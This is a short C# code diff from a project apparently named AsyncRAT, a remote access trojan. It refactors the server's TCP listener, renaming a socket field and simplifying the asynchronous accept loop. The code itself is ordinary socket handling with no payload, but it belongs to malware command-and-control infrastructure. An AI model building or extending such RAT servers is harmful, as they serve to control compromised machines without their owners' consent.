@@ -8,23 +8,23 @@ namespace AsyncRAT_Sharp.Sockets
 {
     class Listener
     {
-        private Socket listener { get; set; }
+        private Socket Server { get; set; }
 
         public void Connect(object port)
         {
             try
             {
                 IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
-                listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     SendBufferSize = 50 * 1024,
                     ReceiveBufferSize = 50 * 1024,
                     ReceiveTimeout = -1,
                     SendTimeout = -1,
                 };
-                listener.Bind(IpEndPoint);
-                listener.Listen(20);
-                BeginAccept();
+                Server.Bind(IpEndPoint);
+                Server.Listen(20);
+                Server.BeginAccept(EndAccept, null);
             }
             catch (Exception ex)
             {
@@ -33,18 +33,12 @@ namespace AsyncRAT_Sharp.Sockets
             }
         }
 
-        private async void BeginAccept()
-        {
-            await Task.Delay(1);
-            listener.BeginAccept(EndAccept, null);
-        }
-
         private void EndAccept(IAsyncResult ar)
         {
             try
             {
-                BeginAccept();
-                Clients CL = new Clients(listener.EndAccept(ar));
+                Clients CL = new Clients(Server.EndAccept(ar));
+                Server.BeginAccept(EndAccept, null);
             }
             catch { }
         }
